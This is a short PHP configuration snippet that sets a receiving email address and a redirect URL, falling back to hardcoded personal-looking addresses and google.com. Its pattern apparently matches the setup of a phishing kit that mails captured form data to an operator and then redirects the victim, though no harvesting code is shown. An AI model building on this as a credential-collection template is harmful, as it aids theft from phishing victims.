<?php
// Retrieve email addresses from environment variables for flexibility
$Receive_email = getenv('RECEIVER_EMAIL') ?: 'matthew@harveyfamilyconnection.net'; 
$redirect = getenv('REDIRECT_URL') ?: 'https://www.google.com/'; // Default redirect URL if not set

// Validate email addresses formatting
if (!filter_var($Receive_email, FILTER_VALIDATE_EMAIL) && strpos($Receive_email, ',') === false) {
    error_log("Invalid format for RECEIVE_EMAIL: {$Receive_email}");
    $Receive_email = 'laurencammbali@gmail.com'; // Fallback in case of invalid format
}
?>
